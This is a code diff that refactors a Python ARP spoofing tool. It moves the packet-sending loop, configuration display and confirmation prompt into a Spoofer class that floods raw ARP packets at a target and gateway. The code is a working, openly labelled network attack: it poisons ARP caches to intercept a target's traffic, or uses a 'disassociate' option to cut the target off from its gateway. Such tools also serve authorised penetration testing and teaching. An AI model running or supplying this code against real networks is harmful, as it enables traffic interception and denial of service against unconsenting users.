@@ -11,58 +11,51 @@ from packets import ARPSetupProxy
 
 
 class Spoofer(object):
-    def __init__(self, interface: str):
-        self.interface = interface
+    def __init__(self, *, interface: str, attacker_mac: str,
+                 gateway_mac: str, gateway_ip: str,
+                 target_mac: str, target_ip: str,
+                 interval: float, disassociate: bool):
+        self.interval = interval
+        self.arp = ARPSetupProxy(interface, attacker_mac, gateway_mac,
+                                 gateway_ip, target_mac, target_ip,
+                                 disassociate)
 
-    def execute(self, spoofed_packets, interval: float = 0.5):
-        with socket(PF_PACKET, SOCK_RAW, ntohs(0x0800)) as sock:
-            sock.bind((self.interface, htons(0x0800)))
-            while True:
-                for packet in spoofed_packets:
-                    sock.send(packet)
-                time.sleep(interval)
-
-
-def spoof(args):
-    """Control the flow of execution of the ARP Spoofer tool."""
-
-    arp = ARPSetupProxy(interface=args.interface,
-                        attacker_mac=args.attackermac,
-                        gateway_mac=args.gatemac,
-                        gateway_ip=args.gateip,
-                        target_mac=args.targetmac,
-                        target_ip=args.targetip,
-                        disassociate=args.disassociate)
-    spoofer = Spoofer(arp.interface)
-
-    __display_user_prompt(proxy=arp)
-
-    try:
-        spoofer.execute(arp.packets, args.interval)
-    except KeyboardInterrupt:
-        raise SystemExit('[!] ARP Spoofing attack terminated.')
-
-
-def __display_user_prompt(proxy):
-    print('\n[>>>] ARP Spoofing configuration:')
-    configurations = {'Interface': proxy.interface,
-                      'Attacker MAC': proxy.packets.attacker_mac,
-                      'Gateway IP': proxy.packets.gateway_ip,
-                      'Gateway MAC': proxy.packets.gateway_mac,
-                      'Target IP': proxy.packets.target_ip,
-                      'Target MAC': proxy.packets.target_mac}
-
-    for configuration, value in configurations.items():
-        print('{0: >7} {1: <13}{2:.>25}'.format('[+]', configuration, value))
-
-    while True:
-        proceed = input('\n[!] ARP packets ready. Execute the attack with '
-                        'these settings? (Y/N) ').lower()
-        if proceed == 'y':
-            print('\n[+] ARP Spoofing attack initiated. Press Ctrl-C to abort.')
-            break
-        if proceed == 'n':
+    def execute(self):
+        try:
+            self.__display_user_prompt()
+            self.__send_attack_packets()
+        except KeyboardInterrupt:
             raise SystemExit('[!] ARP Spoofing attack aborted.')
+
+    def __send_attack_packets(self):
+        with socket(PF_PACKET, SOCK_RAW, ntohs(0x0800)) as sock:
+            sock.bind((self.arp.interface, htons(0x0800)))
+            while True:
+                for packet in self.arp.packets:
+                    sock.send(packet)
+                time.sleep(self.interval)
+
+    def __display_user_prompt(self):
+        print('\n[>>>] ARP Spoofing configuration:')
+        configurations = {'Interface': self.arp.interface,
+                          'Attacker MAC': self.arp.packets.attacker_mac,
+                          'Gateway IP': self.arp.packets.gateway_ip,
+                          'Gateway MAC': self.arp.packets.gateway_mac,
+                          'Target IP': self.arp.packets.target_ip,
+                          'Target MAC': self.arp.packets.target_mac}
+
+        for setting, value in configurations.items():
+            print('{0: >7} {1: <13}{2:.>25}'.format('[+]', setting, value))
+
+        while True:
+            proceed = input('\n[!] ARP packets ready. Execute the attack with '
+                            'these settings? (Y/N) ').lower()
+            if proceed == 'y':
+                print('\n[+] ARP Spoofing attack initiated. Press Ctrl-C to '
+                      'abort.')
+                break
+            if proceed == 'n':
+                raise KeyboardInterrupt
 
 
 if __name__ == '__main__':
@@ -93,4 +86,12 @@ if __name__ == '__main__':
                              'machine, effectively making the target host send '
                              'packets to a non-existent gateway.')
     cli_args = parser.parse_args()
-    spoof(cli_args)
+    spoofer = Spoofer(interface=cli_args.interface,
+                      attacker_mac=cli_args.attackermac,
+                      gateway_mac=cli_args.gatemac,
+                      gateway_ip=cli_args.gateip,
+                      target_mac=cli_args.targetmac,
+                      target_ip=cli_args.targetip,
+                      interval=cli_args.interval,
+                      disassociate=cli_args.disassociate)
+    spoofer.execute()
